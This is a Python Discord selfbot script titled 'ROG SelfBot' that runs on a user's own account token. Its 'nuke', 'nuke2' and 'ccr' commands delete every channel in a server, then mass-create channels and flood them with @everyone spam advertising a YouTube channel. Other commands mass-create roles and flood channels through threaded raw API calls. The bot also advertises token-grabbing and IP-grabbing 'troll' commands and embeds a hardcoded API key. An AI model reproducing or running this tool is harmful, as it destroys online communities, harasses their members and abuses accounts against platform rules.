import os
import colorama
from colorama import Back, Fore, Style
import time
import subprocess
from subprocess import call

colorama.init(autoreset=True)


firstquestion = input(f"[{Fore.GREEN}?{Fore.WHITE}] Are you sure you wanna run it? Having a selfbot to your account is a risk of getting banned. {Fore.GREEN}Y{Fore.WHITE}/{Fore.RED}N{Fore.WHITE} ")
if firstquestion == "N":
    print(f"[{Fore.GREEN}!{Fore.WHITE}] {Fore.RED}Quitting....")
    time.sleep(3)
    os.system('cls')
    def open_py_file():
      call(["python", "C:\\Users\\Admin\\Desktop\\TuraOS\\term\\terminal.py"])

    open_py_file()
if firstquestion == "Y":
    os.system('cls')
    import time
import discord
from discord.ext import commands
from discord.utils import get
import requests
from ipdata import ipdata
import threading
import base64
import random
import string
import colorama
from colorama import Back, Fore, Style
from ast import arg
import json
import aiohttp

token = input("Token: ")
prefix = input("Prefix: ")
channelname = input("Channel Spam: ")
messagespam = input("Message Spam: ")
playing = input("Playing Status: ")
apikey = "7f32279ab303d2b474c05c4d07fdd892f4156d6e45b5d630c2fa5c98" # API Key for the $iplookup command.
rolespam = input("Role Spam: ")


headers = {
  'authorization': token
}


client = commands.Bot(command_prefix=prefix, case_insensitive=True, help_command=None, self_bot=True)
colorama.init(autoreset=True)


@client.event
async def on_ready():
  print(f"[{Fore.GREEN}i{Fore.WHITE}] Streaming status is loading...")
  time.sleep(2)
  os.system('cls')


@client.event
async def on_ready():
   ## await client.change_presence(status= discord.Status.online, activity = discord.Streaming(name = playing, url = "https://www.youtube.com/watch?v=dSyWWfILF_I"))
    print(f"""
    
               ROG SelfBot Made by Wernox.
<<<--------------------------------------------------------->>>
    
    
    {Fore.RED}The selfbot is running.


    {Fore.LIGHTCYAN_EX}{Style.BRIGHT}Raid commands:
    {prefix}nuke
    {prefix}spam
    {prefix}ccr

    {Fore.LIGHTRED_EX}Troll Commands:
    {prefix}gettoken
    {prefix}grabip
    
    {Fore.WHITE}Check if the selfbot works:
    $check
    
    {Fore.BLUE}Fun commands:
    $joke
    $laser
    $hi
    $ohyeah
    $animememe

    {Fore.GREEN}Op commands:
    $iplookup
    
    
    
    """)




@client.command()
async def check(ctx):
    await ctx.send("The selfbot works.")
    print("[!] Runned the command $check.")


@client.command()
async def joke(ctx):
    await ctx.send("Once up a time there was a man sitting in the toilet spinning in circles dancing to his music that he swallowed his phone and was fine and then a rabbit came to the toilet and the man swallowed the rabbit that the rabbit got stuck in his mouth.")
    print("[!] Runned the command $joke.")


@client.command()
async def laser(ctx):
    await ctx.send("LASER! LASER! LASER! LASER! THE LASER, IT IS GREEN! YOU POINT IT IN THE SKY! BUT YOU BE CAREFUL OF THE PLANES! LASER! LASER! LASER! LASER!")
    print("[!] Runned the command $laser.")



@client.command()
async def spam(ctx):
    await ctx.message.delete()
    await ctx.send("A input message was sended to your console.")
    spam = input("What would you like to spam? ")
    print("If you want to stop spamming then close the console.")
    for i in range(100, 200):
        await ctx.send(spam)
        await ctx.send(spam)
        await ctx.send(spam)
        await ctx.send(spam)
        await ctx.send(spam)
        await ctx.send(spam)
        await ctx.send(spam)
        await ctx.send(spam)
        await ctx.send(spam)
        await ctx.send(spam)
        await ctx.send(spam)
        await ctx.send(spam)
        await ctx.send(spam)
        await ctx.send(spam)
        await ctx.send(spam)
        await ctx.send(spam)
        await ctx.send(spam)
    print("[!] Runned the command $spam.")




@client.command()
async def hi(ctx):
    await ctx.send("Hi! What can i do for you?")
    print("[!] Runned the command $hi.")


@client.command()
async def ohyeah(ctx):
    await ctx.send("Can i get a ohhhhyeahhhh!?")
    print("[!] Runned the command $ohyeah.")

@client.command()
async def animememe(ctx):
    await ctx.send("I AM NOT A KING I AM NOT A GOD! I AM....")
    print("[!] Runned the command $animememe.")
    time.sleep(3)
    await ctx.send("ANYA!")

@client.command()
async def nuke(ctx):
  await ctx.message.delete()
  print("[!] Runned the command $nuke.")

  while(True):
    while(True):
        for i in range(500):
          guild = ctx.message.guild
          channels = await guild.create_text_channel(channelname)
          await ctx.guild.create_text_channel(channelname)
          await ctx.guild.create_text_channel(channelname)
          await ctx.guild.create_text_channel(channelname)
          await ctx.guild.create_text_channel(channelname)
          await ctx.guild.create_text_channel(channelname)
          await ctx.guild.create_text_channel(channelname)
          await channels.send(content = messagespam)
          await ctx.guild.create_text_channel(channelname)
          await ctx.guild.create_text_channel(channelname)
          await ctx.guild.create_text_channel(channelname)
          await ctx.guild.create_text_channel(channelname)
          await ctx.guild.create_text_channel(channelname)
          await ctx.guild.create_text_channel(channelname)
          await ctx.guild.create_text_channel(channelname)
          await ctx.guild.create_text_channel(channelname)
          await ctx.guild.create_text_channel(channelname)
          await ctx.guild.create_text_channel(channelname)
          await ctx.guild.create_text_channel(channelname)
          await ctx.guild.create_text_channel(channelname)
          await channels.send(content = messagespam)

@client.command()
async def ccr(ctx):
    await ctx.message.delete()
    print("[!] Runned the command $ccr.")
    for g in ctx.guild.channels:
        await g.delete()
    for s in range(50):
        guild = ctx.message.guild
        channels = await guild.create_text_channel(channelname)
        await ctx.guild.create_text_channel(channelname)
        await ctx.guild.create_text_channel(channelname)
        await ctx.guild.create_text_channel(channelname)
        await ctx.guild.create_text_channel(channelname)
        await ctx.guild.create_text_channel(channelname)
        await ctx.guild.create_text_channel(channelname)
        await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")


@client.command()
async def fuck(ctx):
  await ctx.message.delete()
  for xi in range(250):
   await ctx.guild.create_role(name=rolespam)
   
def threadedspam(id, amount:int,*message):
  payload = {
  'content': message 
  }
  for a in range(amount):
    r = requests.post(f'https://discord.com/api/v9/channels/{id}/messages', data=payload, headers=headers)

def heheheha(id, amount:int, *,message):
  for i in range(25):
    t = threading.Thread(target=threadedspam, args=(id, amount,message))
    t.start()


x = 1


@client.command()
async def fuck2(ctx):
  await ctx.message.delete()
  for x in range(100):
    await ctx.guild.create_text_channel(channelname)
    await ctx.guild.create_text_channel(channelname)
    await ctx.guild.create_text_channel(channelname)



@client.command()
async def nuke2(ctx):
  await ctx.message.delete()
  for g in ctx.guild.channels:
   await g.delete()
  for i in range(100000000000, 1000000000000000000000000000000000000000000000000):
     guild = ctx.message.guild
     channels = await guild.create_text_channel(channelname)
     await ctx.guild.create_text_channel(channelname)
     await ctx.guild.create_text_channel(channelname)
     await ctx.guild.create_text_channel(channelname)
     await ctx.guild.create_text_channel(channelname)
     await ctx.guild.create_text_channel(channelname)
     await ctx.guild.create_text_channel(channelname)
     await ctx.guild.create_text_channel(channelname)
     await ctx.guild.create_text_channel(channelname)
     await ctx.guild.create_text_channel(channelname)
     await ctx.guild.create_text_channel(channelname)
     await ctx.guild.create_text_channel(channelname)
     await ctx.guild.create_text_channel(channelname)
     await ctx.guild.create_text_channel(channelname)
     await ctx.guild.create_text_channel(channelname)
     await ctx.guild.create_text_channel(channelname)
     await ctx.guild.create_text_channel(channelname)
     await ctx.guild.create_text_channel(channelname)
     await ctx.guild.create_text_channel(channelname)
     await ctx.guild.create_text_channel(channelname)
     await ctx.guild.create_text_channel(channelname)
     await ctx.guild.create_text_channel(channelname)
     await ctx.guild.create_text_channel(channelname)
     await ctx.guild.create_text_channel(channelname)
     await ctx.guild.create_text_channel(channelname)
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
